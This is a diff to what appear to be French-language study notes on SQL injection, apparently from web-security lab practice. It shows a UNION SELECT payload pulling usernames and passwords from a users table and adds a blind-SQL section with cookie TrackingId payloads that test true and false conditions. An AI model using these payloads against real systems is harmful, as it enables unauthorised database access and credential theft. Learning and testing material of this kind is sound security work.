@@ -92,3 +92,15 @@ Précédemment nous avons trouver 2 colonnes de type chaîne de caractères, alo
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 ```
 
+## Blind SQL
+
+### Déclencher des réponses conditionnelles dans des cookies
+
+```
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='1 --> toujours vrai donc le serveur renvoi une réponse
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='2 --> pas vrai, donc le serveur ne renvoi rien
+```
+
+
+
+
